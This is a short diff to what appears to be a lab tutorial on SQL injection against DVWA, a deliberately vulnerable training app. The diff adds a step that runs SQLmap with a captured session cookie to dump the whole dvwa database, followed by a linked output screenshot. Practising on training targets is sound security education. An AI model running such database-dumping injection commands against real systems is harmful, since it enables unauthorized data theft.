@@ -822,4 +822,13 @@ sudo sqlmap –u "http://192.168.13.100/dvwa-master/vulnerabilities/sqli/?id=3&S
 1. Use Web Developer Tools (under **Network** tab) and find HTTP packet that contains SQL injection request and select it
 2. Target URL will be the request URL of selected packet to provide to SQLmap
 3. Look for cookie value to provide to SQLmap
-4. 
+4. Run SQLmap:
+
+```
+sudo sqlmap –u "http://192.168.13.100/dvwa-master/vulnerabilities/sqli/?id=3&Submit=Submit" --cookie="security=low; PHPSESSID=ab6iiicumjdbjkmun4cphkdmvo" –D dvwa --dump-all
+```
+
+- Output:
+
+![](https://i.imgur.com/sdufOcE.png)
+
